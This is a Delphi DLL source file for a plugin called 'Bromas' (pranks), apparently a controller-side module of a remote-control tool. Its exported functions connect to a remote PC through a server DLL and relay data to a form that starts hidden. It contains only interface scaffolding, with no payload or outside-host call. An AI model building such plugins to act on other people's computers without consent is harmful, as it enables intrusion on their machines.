library BromasC;


uses
  windows,
  forms,
  unitmain;

  const
  strPluginNombre: WideString = 'Bromas';
  strAutor:        WideString = 'Coolvibes Team';
  strCategoria:    Widestring = 'Miscellanous';
  strVersion:      WideString = '1.0';


  {$R *.res}

function PluginName: WideString; stdcall;
begin
  result := strPluginNombre;
end;

function Autor: WideString; stdcall;
begin
  result := strAutor;
end;

function Categoria: WideString; stdcall;
begin
  result := strCategoria;
end;

function Version: WideString; stdcall;
begin
  result := strVersion;
end;

function Conectar(pU:WideString;pConectionID,pPluginsID: integer;pSendData:pointer):pointer; stdcall;
var
  frm: TFormMain;
begin
  frm := TFormMain.Create(nil);
  frm.Caption := 'Bromas - '+pU;    //Identificador del pc remoto
  frm.ConectionID := pConectionID;  //Socket en caso de necesitarlo en este caso no hace falta
  frm.PluginsID := pPluginsID;      // id del plugin
  frm.SendData:= pSendData;         //funcion para conectar con el cliente
  //frm.Show; iniciamos sin mostrarlo, y al recibir información de la dll del server lo mostramos
  Result := Pointer(frm);
end;

procedure Desconectado(Form:Pointer);stdcall;   //El servidor se ha desconectado
begin
  if assigned(Form) then  //Cerramos la form al finalizar
    TFormMain(Form).close;
end;

procedure RecData(Form:Pointer;data:string);stdcall;
begin
   if assigned(Form) then
    TFormMain(Form).Recdata(data);
end;
//por si queremos utilizar un forma directa de mostrar el formulario.
procedure ShowClientWindow(pHandle: Integer); stdcall;
begin
 FormMain.Show;
end;

exports
        Conectar,
        Desconectado,
        RecData,
        PluginName,
        Autor,
        Categoria,
        Version,
        ShowClientWindow;

procedure DLLEntryProc(EntryCode: integer);
begin
  case EntryCode of
    DLL_PROCESS_DETACH:
      begin
        (*
            Clean-up code
        *)
      end;
    DLL_PROCESS_ATTACH:
      begin
        (*
            Init code
        *)
      end;
  end;
end;

begin
  DllProc := @DLLEntryProc;
  DLLEntryProc(DLL_PROCESS_ATTACH);
end.
